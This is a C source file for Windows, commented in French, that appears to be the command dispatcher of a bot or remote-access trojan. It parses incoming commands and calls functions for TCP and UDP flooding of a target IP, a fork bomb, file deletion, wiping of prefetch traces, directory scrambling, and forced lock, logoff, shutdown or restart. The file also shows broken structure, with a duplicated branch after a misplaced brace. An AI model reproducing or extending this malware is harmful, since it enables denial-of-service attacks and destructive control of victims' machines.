#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "proto.h"

void ftexec(char *command) {

    char *token = strtok(command, " "); // Divise la chaîne en mots
    int len = strlen(command);
    if (len > 0 && (command[len - 1] == '\n' || command[len - 1] == '\r')) 
    {
        command[len - 1] = '\0';  // Supprimer le caractère de fin de ligne
    }

    if (token != NULL) {
        if (strcmp(token, "ddostcp") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre port
            if (token != NULL) {
                int port = atoi(token);

                token = strtok(NULL, " "); // Obtient le troisième mot de la string qui est notre addresse ip
                if (token != NULL) {
                    char * addrip = token;
                    
                    token = strtok(NULL, " "); // Obtient le quatrième mot de la string qui est notre nombre de paquets
                    if (token != NULL) {
                        int nbpackets = atoi(token);

                        token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                        if (token != NULL) {
                            int sizepacket = atoi(token);

                            token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                            if (token != NULL) {
                                int delai = atoi(token);
                                ddostcp(port, addrip, nbpackets, sizepacket, delai );
                            }
                        }
                    } 
                } 
            } 
        }


        else if (strcmp(token, "ddosudp") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre port
            if (token != NULL) {
                int port = atoi(token);

                token = strtok(NULL, " "); // Obtient le troisième mot de la string qui est notre addresse ip
                if (token != NULL) {
                    char * addrip = token;
                    
                    token = strtok(NULL, " "); // Obtient le quatrième mot de la string qui est notre nombre de paquets
                    if (token != NULL) {
                        int nbpackets = atoi(token);

                        token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                        if (token != NULL) {
                            int sizepacket = atoi(token);

                            token = strtok(NULL, " "); // Obtient le cinquieme mot de la string qui est notre delai entre chaque paquets
                            if (token != NULL) {
                                int delai = atoi(token);
                                ddosudp(port, addrip, nbpackets, sizepacket, delai );
                            }
                        }
                    } 
                } 
            } 
        }


        else if (strcmp(token, "delfile") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
            if (token != NULL) {
                char * fichierdel = token;
                supfichier (fichierdel);

            } 
        }


        else if (strcmp(token, "forkbomb") == 0) {
            forkbomb();
        }

        else if (strcmp(token, "test") == 0) {
            printf("Comparaison de string test : OK!");
            Sleep(3000);
        }


        else if (strcmp(token, "delprefetch") == 0) {
            deletePrefetchFiles(); 
        }
 

        else if (strcmp(token, "image") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
            if (token != NULL) {
                char * fichierimage = token;
                image(fichierimage);

            } 
        }

        else if (strcmp(token, "lock") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
             if (token != NULL) {
                lock();
            } 
        }


        else if (strcmp(token, "logoff") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
             if (token != NULL) {
                logoff();
            } 
        }

        else if (strcmp(token, "shutdownfunc") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
             if (token != NULL) {
                shutdownfunc();
            } 
        }

        else if (strcmp(token, "restart") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
             if (token != NULL) {
                restart();
            } 
        }


        else if (strcmp(token, "song") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
             if (token != NULL) {
                char * filename = token;
                song(token);
            } 
        }


        else if (strcmp(token, "randomize") == 0) {

            token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
             if (token != NULL) {
                char *directoryPath = token;
                randomize(directoryPath);
            } 
        }


        else if (strcmp(token, "sysinfo") == 0) {
            
             GetSysInf();
            }

        else if (strcmp(token, "fonction2") == 0) {
            token = strtok(NULL, " "); // Obtient le deuxième mot (paramètre a)
            if (token != NULL) {
                int a = atoi(token);

                token = strtok(NULL, " "); // Obtient le troisième mot (paramètre b)
                if (token != NULL) {
                    int b = atoi(token);
                    //fonction2(a, b);
                } else {
                    printf("Paramètre b manquant.\n");
                }
            } else {
                printf("Paramètre a manquant.\n");
            }
        }
        

        } else if (strcmp(token, "fonction2") == 0) {
            token = strtok(NULL, " "); // Obtient le deuxième mot (paramètre a)
            if (token != NULL) {
                int a = atoi(token);

                token = strtok(NULL, " "); // Obtient le troisième mot (paramètre b)
                if (token != NULL) {
                    int b = atoi(token);
                    //fonction2(a, b);
                } else {
                    printf("Paramètre b manquant.\n");
                }
            } else {
                printf("Paramètre a manquant.\n");
            }
        }


         else {
            printf("Fonction inconnue.\n");
            Sleep(5000);
        }
    }

// A faire en se basant sur le nombre de fonction et le nombre d'arguments